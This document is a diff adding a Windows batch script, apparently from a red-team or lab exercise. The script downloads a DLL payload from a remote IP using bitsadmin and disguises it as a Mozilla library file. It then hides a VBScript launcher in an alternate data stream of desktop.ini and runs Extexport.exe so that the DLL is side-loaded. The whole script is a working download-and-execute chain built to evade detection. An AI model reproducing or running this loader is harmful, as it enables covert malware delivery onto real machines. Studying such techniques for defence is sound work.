@@ -1,0 +1,34 @@
+@echo off
+
+setlocal enabledelayedexpansion
+
+
+rem Set the path of the VBscript file that will be created.
+rem The path should be an Alternate Data Stream of "C:\Users\Public\desktop.ini".
+rem You need to append to the path a colon and the name of the VBscript file.
+rem For example "...:launcher.vbs"
+
+set PATH_LAUNCHER_ADS=C:\Users\Public\desktop.ini:fns.vbs
+
+
+
+rem Download the DLL payload from the server using BitsAdmin.
+rem Save the DLL file in C:\Users\Public\Libraries, with any name among "mozcrt19.dll", "mozsqlite3.dll", or "sqlite3.dll"
+
+start /b bitsadmin /transfer mydll /priority FOREGROUND http://192.168.18.129/bombaMaradona.dll C:\Users\Public\Libraries\mozcrt19.dll
+
+
+
+rem Call "C:\Program Files (x86)\Internet Explorer\Extexport.exe" from this script.
+rem As first parameter, use the path "C:\Users\Public\Libraries".
+rem As second and third parameters, use two random strings (such as "bla bla").
+
+echo Dim objShell > %PATH_LAUNCHER_ADS%
+echo Set objShell = WScript.CreateObject("WScript.Shell") >> %PATH_LAUNCHER_ADS%
+echo Set oExec = objShell.Exec("C:\Program Files (x86)\Internet Explorer\Extexport.exe C:\Users\Public\Libraries FN S") >> %PATH_LAUNCHER_ADS%
+echo Set objShell = Nothing >> %PATH_LAUNCHER_ADS%
+
+
+rem This will execute the hidden launcher from the ADS
+cscript "%PATH_LAUNCHER_ADS%"
+
